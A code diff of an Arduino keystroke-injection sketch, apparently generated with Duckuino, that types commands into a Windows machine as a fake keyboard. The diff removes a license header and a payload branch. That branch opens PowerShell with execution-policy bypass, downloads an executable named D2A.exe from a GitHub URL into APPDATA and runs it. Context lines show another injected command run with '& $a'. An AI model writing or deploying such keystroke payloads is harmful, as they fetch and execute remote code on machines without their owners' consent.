@@ -1,8 +1,3 @@
-/**
- * Made with Duckuino, an open-source project.
- * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
- */
-
 #include "Keyboard.h"
 
 void typeKey(uint8_t key)
@@ -25,7 +20,7 @@ void setup()
     if (digitalRead(7) == LOW){input += "0";} else {input += "1";}
     if (digitalRead(8) == LOW){input += "0";} else {input += "1";}
     if (digitalRead(9) == LOW){input += "0";} else {input += "1";}
-    input = "0001";
+  
   if (input == "0000") {
     Keyboard.begin();
     delay(250);
@@ -68,35 +63,6 @@ void setup()
     Keyboard.print(F("& $a"));
     typeKey(KEY_RETURN);
     delay(500);
-    delay(5000);
-    Keyboard.end();
-  }
-  else if (input == "0010") {
-    Keyboard.begin();
-    delay(1500);
-    Keyboard.press(KEY_LEFT_GUI);
-    Keyboard.press('r');
-    Keyboard.releaseAll();
-    delay(500);
-    Keyboard.print(F("powershell -NoP -NonI -Exec Bypass"));
-    delay(250);
-    typeKey(KEY_RETURN);
-    delay(200);
-    Keyboard.print(F("$ProcName = 'D2A.exe'"));
-    typeKey(KEY_RETURN);
-    delay(200);
-    Keyboard.print(F("$WebFile = 'https://github.com/nerdpepe/WiFi-Bunny/blob/main/Converter/$ProcName'"));
-    typeKey(KEY_RETURN);
-    delay(200);
-    Keyboard.print(F("Clear-Host"));
-    typeKey(KEY_RETURN);
-    delay(200);
-    Keyboard.print(F("(New-Object System.Net.WebClient).DownloadFile($WebFile,'$env:APPDATA\$ProcName')"));
-    typeKey(KEY_RETURN);
-    delay(200);
-    Keyboard.print(F("Start-Process ('$env:APPDATA\$ProcName')"));
-    typeKey(KEY_RETURN);
-    delay(200);
     delay(5000);
     Keyboard.end();
   }
